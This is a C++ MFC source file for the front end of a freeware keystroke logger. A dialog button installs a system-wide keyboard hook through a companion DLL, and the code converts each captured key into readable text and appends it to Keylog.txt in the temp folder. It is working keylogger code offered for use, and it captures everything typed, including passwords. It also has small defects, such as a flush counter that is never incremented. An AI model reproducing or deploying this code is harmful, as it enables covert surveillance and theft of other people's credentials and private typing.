// KeyexeDlg.cpp : implementation file
//
//	Disclaimer
//	----------
//	THIS SOFTWARE AND THE ACCOMPANYING FILES ARE DISTRIBUTED "AS IS" AND WITHOUT
//	ANY WARRANTIES WHETHER EXPRESSED OR IMPLIED. NO REPONSIBILITIES FOR POSSIBLE
//	DAMAGES OR EVEN FUNCTIONALITY CAN BE TAKEN. THE USER MUST ASSUME THE ENTIRE
//	RISK OF USING THIS SOFTWARE.
//
//	Terms of use
//	------------
//	THIS SOFTWARE IS FREE FOR PERSONAL USE OR FREEWARE APPLICATIONS.
//	IF YOU USE THIS SOFTWARE IN COMMERCIAL OR SHAREWARE APPLICATIONS YOU
//	ARE GENTLY ASKED TO SEND ONE LICENCED COPY OF YOUR APPLICATION(S)
//	TO THE AUTHOR. IF YOU WANT TO PAY SOME MONEY INSTEAD, CONTACT ME BY
//	EMAIL. YOU ARE REQUESTED TO CONTACT ME BEFORE USING THIS SOFTWARE
//	IN YOUR SHAREWARE/COMMERCIAL APPLICATION.
//
//	Contact info:
//	Site: http://bizkerala.hypermart.net
//	Email: anoopt@gmx.net
//----------------------------------------------------------------------------------
//
//	Usage Instructions: See Readme.txt for Both 'Keyexe' & 'Keydll3' projects.
//
//----------------------------------------------------------------------------------
#include "stdafx.h"
#include "Keyexe.h"
#include "KeyexeDlg.h"
#include "..\Keydll3\Keydll3.h"//Include this for functions in the DLL.

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define WM_KEYSTROKE (WM_USER + 755)//This message is recieved when key is down/up
/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CKeyexeDlg dialog

CKeyexeDlg::CKeyexeDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CKeyexeDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CKeyexeDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	hooked = false;// Initialize all members here.
	char pth[255];
	GetTempPath(255,pth);
	CString ph(pth);
	ph = ph + "Keylog.txt";
	diskfile = new CFile(ph,CFile::modeCreate|CFile::modeWrite);
	strcpy(buffer,"");
	keycount = 0;
}

void CKeyexeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CKeyexeDlg)
	DDX_Control(pDX, IDOK, m_hook);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CKeyexeDlg, CDialog)
	//{{AFX_MSG_MAP(CKeyexeDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, OnHook)
	ON_MESSAGE(WM_KEYSTROKE, processkey)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CKeyexeDlg message handlers

BOOL CKeyexeDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CKeyexeDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CKeyexeDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CKeyexeDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CKeyexeDlg::OnHook()//Install or Remove keyboard Hook.
{
	// TODO: Add your control notification handler code here
	if(hooked==true)
	{
		removehook();
		hooked = false;
		m_hook.SetWindowText("Hook Keyboard");		
	}
	else
	{
		installhook(this->GetSafeHwnd());
		hooked = true;
		m_hook.SetWindowText("UnHook Keyboard");
	}
	
}

void CKeyexeDlg::OnCancel() //On exit, do cleanup(Close files, remove hook.).
{
	// TODO: Add extra cleanup here
	if(hooked==true)
	{
		removehook();
		if(diskfile!=NULL)
		{
			diskfile->Flush();
			delete diskfile;
		}
	}

	CDialog::OnCancel();
}

LRESULT CKeyexeDlg::processkey(WPARAM w, LPARAM l)//This block processes the keystroke info.
{
	GetKeyNameText(l,buffer,20);
	_strlwr(buffer);
	if(strlen(buffer)>1)
	{
		subst("shift","<SHIFT>");
		subst("right shift","<SHIFT>");
		subst("tab","<TAB>");
		subst("space"," ");
		subst("backspace","<BACKSPACE>");
		subst("delete","<DEL>");
		subst("left","<LEFT>");
		subst("down","<DOWN>");
		subst("up","<UP>");
		subst("right","<RIGHT>");
		subst("num /","/");
		subst("num *","*");
		subst("num -","-");
		subst("num 0","0");
		subst("num 1","1");
		subst("num 2","2");
		subst("num 3","3");
		subst("num 4","4");
		subst("num 5","5");
		subst("num 6","6");
		subst("num 7","7");
		subst("num 8","8");
		subst("num 9","9");
		subst("num +","+");
		subst("num enter","<ENTER>");
		subst("num del","<DEL>");
		subst("esc","<ESC>");
		subst("enter","<ENTER>");
		subst("caps lock","<CAPSLOCK>");
		subst("num lock","<NUMLOCK>");
		subst("scroll lock","<SCROLLLOCK>");
		subst("ctrl","<CTRL>");
		subst("alt","<ALT>");
		subst("right ctrl","<CTRL>");
		subst("right alt","<ALT>");
		subst("pause","<PAUSE>");
		subst("insert","<INSERT>");
		subst("home","<HOME>");
		subst("end","<END>");
		subst("page up","<PGUP>");
		subst("page down","<PGDN>");
		subst("f1","<F1>");
		subst("f2","<F2>");
		subst("f3","<F3>");
		subst("f4","<F4>");
		subst("f5","<F5>");
		subst("f6","<F6>");
		subst("f7","<F7>");
		subst("f8","<F8>");
		subst("f9","<F9>");
		subst("f10","<F10>");
		subst("f11","<F11>");
		subst("f12","<F12>");
	}
	diskfile->Write(buffer,strlen(buffer));
	if(keycount>50)
	{
		diskfile->Flush();
		keycount = 0;
	}
	return 0L;
}

void CKeyexeDlg::subst(const char *src, const char *dest)//Some key substitutions.
{
	if(strcmp(buffer,src)==0)
		strcpy(buffer,dest);
}
